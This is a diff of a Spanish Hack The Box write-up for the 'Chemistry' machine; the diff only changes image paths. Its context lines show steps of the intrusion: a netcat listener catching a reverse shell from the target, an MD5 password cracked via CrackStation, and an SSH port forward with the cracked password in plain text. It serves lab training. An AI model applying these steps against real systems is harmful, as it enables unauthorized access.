@@ -152,11 +152,11 @@ http://10.10.11.38:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkze
 
 La página presenta opciones para iniciar sesión y registrarse. Se crea una cuenta y se accede al sistema.
 
-![](assets/img/htb-writeup-chemistry/chemistry1_1.png)
+![](/assets/img/htb-writeup-chemistry/chemistry1_1.png)
 
 En el dashboard, hay una utilidad para subir archivos de tipo CIF.
 
-![](assets/img/htb-writeup-chemistry/chemistry1_2.png)
+![](/assets/img/htb-writeup-chemistry/chemistry1_2.png)
 
 Se proporciona un archivo de ejemplo, al inspeccionarlo, se observa la siguiente estructura.
 
@@ -213,7 +213,7 @@ _space_group_magn.name_BNS  "P  n'  m  a'  "
 	listening on [any] 4321 ...
 ```
 
-![](assets/img/htb-writeup-chemistry/chemistry1_3.png)
+![](/assets/img/htb-writeup-chemistry/chemistry1_3.png)
 
 ```terminal
 	... connect to [10.10.16.79] from (UNKNOWN) [10.10.11.38] 33946
@@ -266,7 +266,7 @@ El hash de el usuario `rosa` se identifica como MD5 y se intenta recuperar su va
 
 Utilizo [CrackStation](https://crackstation.net/) para descifrar la contraseña.
 
-![](assets/img/htb-writeup-chemistry/chemistry2_1.png)
+![](/assets/img/htb-writeup-chemistry/chemistry2_1.png)
 
 ```terminal
 app@chemistry:~/instance$ su rosa
@@ -284,14 +284,14 @@ Encuentro un servicio corriendo en el puerto `8080`.
 rosa@chemistry:~$ ss -tulnp
 ```
 
-![](assets/img/htb-writeup-chemistry/chemistry3_1.png)
+![](/assets/img/htb-writeup-chemistry/chemistry3_1.png)
 
 ```terminal
 /home/kali/Documents/htb/machines/chemistry:-$ ssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38 -f -N
 rosa@10.10.11.38's password: unicorniosrosados
 ```
 
-![](assets/img/htb-writeup-chemistry/chemistry3_2.png)
+![](/assets/img/htb-writeup-chemistry/chemistry3_2.png)
 
 Escaneo la web en busca de directorios.
 
